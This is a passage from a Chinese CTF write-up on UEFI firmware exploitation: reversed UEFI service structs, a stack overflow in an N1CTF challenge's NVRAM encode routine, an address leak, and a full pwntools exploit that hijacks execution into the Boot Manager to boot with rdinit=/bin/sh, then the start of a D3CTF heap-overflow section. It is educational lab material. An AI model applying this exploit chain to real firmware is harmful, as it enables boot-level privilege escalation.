中添加的结构体，其各个成员的数据类型并不正确，不过在 IDA 中静态分析中够用了，当遇到调用某个函数时如果想搞清楚直接就源码就行了。  </p><h4 id="RuntimeService"><a href="#RuntimeService" class="headerlink" title="RuntimeService"></a>RuntimeService</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">RuntimeService</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> Hdr[<span class="number">24</span>];</span><br><span class="line">  <span class="type">size_t</span> (*GetTime)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*SetTime)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*GetWakeupTime)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*SetWakeupTime)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*SetVirtualAddressMap)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*ConvertPointer)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*GetVariable)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*GetNextVariableName)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*SetVariable)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*GetNextHighMonotonicCount)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*ResetSystem)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*UpdateCapsule)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*QueryCapsuleCapabilities)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*QueryVariableInfo)(<span class="type">void</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="BootServices"><a href="#BootServices" class="headerlink" title="BootServices"></a>BootServices</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">BootServices</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> Hdr[<span class="number">24</span>];</span><br><span class="line">  <span class="type">size_t</span> (*RaiseTPL)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*RestoreTPL)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*AllocatePages)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*FreePages)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*GetMemoryMap)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*AllocatePool)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*FreePool)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*CreateEvent)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*SetTimer)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*WaitForEvent)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*SignalEvent)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*CloseEvent)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*CheckEvent)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*InstallProtocolInterface)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*ReinstallProtocolInterface)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*UninstallProtocolInterface)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*HandleProtocol)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*Reserved)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*RegisterProtocolNotify)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*LocateHandle)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*LocateDevicePath)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*InstallConfigurationTable)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*LoadImage)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*StartImage)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*Exit)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*UnloadImage)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*ExitBootServices)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*GetNextMonotonicCount)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*Stall)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*SetWatchdogTimer)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*ConnectController)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*DisconnectController)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*OpenProtocol)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*CloseProtocol)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*OpenProtocolInformation)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*ProtocolsPerHandle)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*LocateHandleBuffer)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*LocateProtocol)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*InstallMultipleProtocolInterfaces)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*UninstallMultipleProtocolInterfaces)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*CalculateCrc32)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*CopyMem)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*SetMem)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*CreateEventEx)(<span class="type">void</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="EFI-SIMPLE-TEXT-OUTPUT-PROTOCOL"><a href="#EFI-SIMPLE-TEXT-OUTPUT-PROTOCOL" class="headerlink" title="EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL"></a>EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">size_t</span> (*Reset)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*OutputString)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*TestString)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*QueryMode)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*SetMode)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*SetAttribute)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*ClearScreen)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*SetCursorPosition)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*EnableCursor)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> *EFI_SIMPLE_TEXT_OUTPUT_MODE_Mode;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="EFI-SIMPLE-TEXT-INPUT-PROTOCOL"><a href="#EFI-SIMPLE-TEXT-INPUT-PROTOCOL" class="headerlink" title="EFI_SIMPLE_TEXT_INPUT_PROTOCOL"></a>EFI_SIMPLE_TEXT_INPUT_PROTOCOL</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">EFI_SIMPLE_TEXT_INPUT_PROTOCOL</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">size_t</span> (*Reset)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*ReadKeyStroke)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> (*WaitForKey)(<span class="type">void</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="SystemTable"><a href="#SystemTable" class="headerlink" title="SystemTable"></a>SystemTable</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">SystemTable</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> Hdr[<span class="number">24</span>];</span><br><span class="line">  <span class="type">char</span> FirmwareVendor[<span class="number">8</span>];</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> FirmwareRevision;</span><br><span class="line">  <span class="type">size_t</span> (*ConsoleInHandle)(<span class="type">void</span>);</span><br><span class="line">  EFI_SIMPLE_TEXT_INPUT_PROTOCOL *ConIn;</span><br><span class="line">  <span class="type">size_t</span> (*ConsoleOutHandle)(<span class="type">void</span>);</span><br><span class="line">  EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL *ConOut;</span><br><span class="line">  <span class="type">size_t</span> (*StandardErrorHandle)(<span class="type">void</span>);</span><br><span class="line">  <span class="type">size_t</span> *StdErr;</span><br><span class="line">  <span class="type">size_t</span> (*RuntimeServices)(<span class="type">void</span>);</span><br><span class="line">  BootServices *BootServices;</span><br><span class="line">  <span class="type">size_t</span> NumberOfTableEntries;</span><br><span class="line">  <span class="type">size_t</span> ConfigurationTable;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="漏洞分析与利用"><a href="#漏洞分析与利用" class="headerlink" title="漏洞分析与利用"></a>漏洞分析与利用</h3><p>这里先解释各个函数做了什么：<br>1、Add：利用 SetVariable 将用户自定义的 (key, value) 写入 NVRAM 中<br>2、Delete：利用 SetVariable 将 NVRAM 中指定的 key 的 value 清空<br>3、Get：用 GetVariable 获取 NVRAM 中指定 key 的 value 并打印<br>4、Encode：利用 GetVariable 获取 NVRAM 中指定 key 的 value 并存储在 Data_1 中，根据 Data_1 的长度用 GetVariable 将 NVRAM 中 N1CTF_KEY(1&#x2F;2&#x2F;3) 对应的 value 存储在 Data_2 中，并将 Data_1 和 Data_2 进行亦或，最后将最终的 Data_1 通过 SetVariable 存储回 NVRAM 中。  </p><p>这里需要注意的是根据 Data_1 的长度用 GetVariable 将 NVRAM 中 N1CTF_KEY(1&#x2F;2&#x2F;3) 对应的 value 存储在 Data_2 中这一步，他是在一个 for 循环中进行的，而且在上一次循环结束后下一次循环开始时并没有对 DataSize 的值进行初始化。<br>我们知道在调用 GetVariable 时 DataSize 会被设置为 NVRAM 中读取的 value 的长度，如果我们能够设置 N1CTF_KEY1 的 value 长度很长，那么我们在用 GetVariable 获取 N1CTF_KEY2 的 value 时就会在 Data_2 上发生栈溢出，而 N1CTF_KEY 的 value 值我们可以通过 Add 函数进行设置。  </p><p>接下来我们面临着两个问题：<br>1、如何获取 UiApp 固件的基址<br>2、栈溢出后我们要劫持到哪里</p><h3 id="地址泄露"><a href="#地址泄露" class="headerlink" title="地址泄露"></a>地址泄露</h3><p>在 Add 的时候，如果我们的 value 长度刚好为 256，那么我们在 Get 的时候会带出后面的一些数据，原理应该和用户态的 puts 函数类似，通过 \x00 截断输出，value 的数组长度为 256，而且后面刚好跟着一个地址对象，所以把 \x00 填满后就能够将其带出来，通过分析这个地址和 UiApp 的基址偏移是固定的。<br>在 gdb 中获取 UiApp 方式和我们上一篇文章 <a href="https://9anux.org/2024/12/14/uefi/#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90-2">DubheCTF 2024 ToySMM</a> 中获取后门函数的地址方式是一样的，都是直接在 gdb 中搜索代码的 text 段的十六进制串。  </p><h3 id="执行流的劫持"><a href="#执行流的劫持" class="headerlink" title="执行流的劫持"></a>执行流的劫持</h3><p>这里我们交叉引用我们的 vuln 函数找到调用它的地方： </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( vuln() )</span><br><span class="line">&#123;</span><br><span class="line">  Output(<span class="string">&quot;No No No!\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0x8000000000000003</span>ui64;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  sub_23A4(<span class="number">0</span>);</span><br><span class="line">  sub_11A4();</span><br><span class="line">  sub_2645();</span><br><span class="line">  sub_C6B3(v5);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而我们的 vuln 函数的返回值是 0x8000000000000003ui64，所以不难猜测 else 分支就是进入 Boot Manager，所以将返回地址劫持到该 else 分支即可进入到 Boot Manager 界面：  </p><img src="/2025/01/06/uefi2/2.png" class="" title="我的图图呢">  <p>最后在 Boot Manager 中加入自己的启动项使用 root 启动系统即可。  </p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>由于 Boot Manager 是可视化界面，在 pwntools 上非常难看，所以这里使用 socat 连接。</p><h4 id="exp-sh"><a href="#exp-sh" class="headerlink" title="exp.sh"></a>exp.sh</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">socat $(<span class="built_in">tty</span>),<span class="built_in">echo</span>=0,escape=0x03 SYSTEM:<span class="string">&#x27;python3 ./exp.py&#x27;</span> 2&gt;&amp;1</span><br></pre></td></tr></table></figure><h4 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process([<span class="string">&#x27;python3&#x27;</span>,<span class="string">&#x27;run.py&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">buf</span>):</span><br><span class="line">    log.success(<span class="string">f&#x27;\033[33m<span class="subst">&#123;buf&#125;</span>:<span class="subst">&#123;<span class="built_in">eval</span>(buf):#x&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">name,value</span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Key name:&#x27;</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;value&#x27;</span>)</span><br><span class="line">    p.sendline(value)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addSend</span>(<span class="params">name,value</span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Key name:&#x27;</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;value&#x27;</span>)</span><br><span class="line">    p.send(value)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">name</span>):</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Key name:&#x27;</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">name</span>):</span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Key name:&#x27;</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line"></span><br><span class="line">key_map = &#123;</span><br><span class="line">    <span class="string">b&quot;up&quot;</span>:    <span class="string">b&quot;\x1b[A&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;down&quot;</span>:  <span class="string">b&quot;\x1b[B&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;left&quot;</span>:  <span class="string">b&quot;\x1b[D&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;right&quot;</span>: <span class="string">b&quot;\x1b[C&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;esc&quot;</span>:   <span class="string">b&quot;\x1b^[&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;enter&quot;</span>: <span class="string">b&quot;\r&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;tab&quot;</span>:   <span class="string">b&quot;\t&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_key</span>(<span class="params">key,times = <span class="number">1</span></span>):</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(times):</span><br><span class="line">        p.send(key_map[key])</span><br><span class="line">        <span class="keyword">if</span> key == <span class="string">b&quot;enter&quot;</span>:</span><br><span class="line">            p.recv()</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&quot;\x1b[24~&quot;</span>*<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">addSend(<span class="string">b&#x27;leak&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">256</span>)</span><br><span class="line">get(<span class="string">b&#x27;leak&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">256</span>)</span><br><span class="line">data = p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop = <span class="literal">True</span>)</span><br><span class="line">leak, i, j = <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i &lt; <span class="built_in">len</span>(data):</span><br><span class="line">    <span class="keyword">if</span> data[i] == <span class="built_in">ord</span>(<span class="string">b&quot;\\&quot;</span>):</span><br><span class="line">        n = <span class="built_in">int</span>(data[i+<span class="number">2</span>:i+<span class="number">4</span>], <span class="number">16</span>)</span><br><span class="line">        i += <span class="number">4</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        n = data[i]</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    leak += n * (<span class="number">0x100</span>**j)</span><br><span class="line">    j += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">uiapp_base = leak - <span class="number">0x1e009c0</span></span><br><span class="line">boot = uiapp_base + <span class="number">0x235A</span></span><br><span class="line">lg(<span class="string">&quot;leak&quot;</span>)</span><br><span class="line">lg(<span class="string">&quot;uiapp_base&quot;</span>)</span><br><span class="line">lg(<span class="string">&quot;boot&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> + p32(boot)</span><br><span class="line">add(<span class="string">b&quot;N1CTF_KEY1&quot;</span>, payload)</span><br><span class="line">add(<span class="string">b&quot;N1CTF_KEY2&quot;</span>, payload)</span><br><span class="line">add(<span class="string">b&quot;win&quot;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x11</span>)</span><br><span class="line"></span><br><span class="line">encode(<span class="string">b&#x27;win&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Standard PC&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;down&quot;</span>, <span class="number">3</span>)</span><br><span class="line">send_key(<span class="string">b&quot;enter&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;enter&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;down&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;enter&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;enter&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;down&quot;</span>, <span class="number">3</span>)</span><br><span class="line">send_key(<span class="string">b&quot;enter&quot;</span>)</span><br><span class="line">p.send(<span class="string">b&quot;\rrootshell\r&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;down&quot;</span>)</span><br><span class="line">p.send(<span class="string">b&quot;\rconsole=ttyS0 initrd=rootfs.img rdinit=/bin/sh quiet\r&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;down&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;enter&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;up&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;enter&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;esc&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;enter&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;down&quot;</span>, <span class="number">3</span>)</span><br><span class="line">send_key(<span class="string">b&quot;enter&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>效果如下：  </p><img src="/2025/01/06/uefi2/3.png" class="" title="我的图图呢">  <h2 id="Heap-OverFlow"><a href="#Heap-OverFlow" class="headerlink" title="Heap OverFlow"></a>Heap OverFlow</h2><p>这里用的环境是 D3CTF 2022 d3guard，这道题目当时是 0 解，而且涉及到很多比较冷门的知识点，笔者觉得这题出得非常的硬核，学到了非常多的东西Orz  </p><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>和上一道题目一样，运行 run.py 后获得的是一个低权限的 shell，需要我们提权后才能够获取 flag。在启动 qemu 的时候我们按 f12 就能够进入到出题人自己实现的交互界面。  </p><img src="/2025/01/06/uefi2/5.png" class="" title="我的图图呢">  <p>不难想到漏洞就出现在这个地方，在 IDA 中进行字符串的搜索考研很快的定位到这部分的功能由 UiApp 组件实现。由于这道题涉及到 UEFI 的堆管理系统，所以下面就先简单的介绍一下 UEFI 的堆。</p><h3 id="堆块的管理"><a href="#堆块的管理" class="headerlink" title="堆块的管理"></a>堆块的管理</h3><p>如果想知道详细的过程请读者自行去看<a href="https://github.com/tianocore/edk2/blob/master/MdeModulePkg/Core/Dxe/Mem/Pool.c">源码</a>，这里我只简单的总结一下分配的堆块没有很大的情况，而且忽略了很多细节（比如堆块合并）。  </p><p>在 UEFI 中存在一个 mPoolHead 数组用于存储 POOL 结构体，该数组的每一个索引对应着不同 EfiMemoryType 类型的 POOL，相关代码如下：  </p><p><strong>POOL</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  INTN               Signature;</span><br><span class="line">  UINTN              Used;</span><br><span class="line">  EFI_MEMORY_TYPE    MemoryType;</span><br><span class="line">  LIST_ENTRY         FreeList[MAX_POOL_LIST];</span><br><span class="line">  LIST_ENTRY         Link;</span><br><span class="line">&#125; POOL;</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Pool header for each memory type.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">POOL  mPoolHead[EfiMaxMemoryType];</span><br><span class="line"></span><br><span class="line"><span class="comment">///</span></span><br><span class="line"><span class="comment">/// LIST_ENTRY structure definition.</span></span><br><span class="line"><span class="comment">///</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">LIST_ENTRY</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">///</span></span><br><span class="line"><span class="comment">/// _LIST_ENTRY structure definition.</span></span><br><span class="line"><span class="comment">///</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> &#123;</span></span><br><span class="line">  LIST_ENTRY    *ForwardLink;</span><br><span class="line">  LIST_ENTRY    *BackLink;</span><br><span 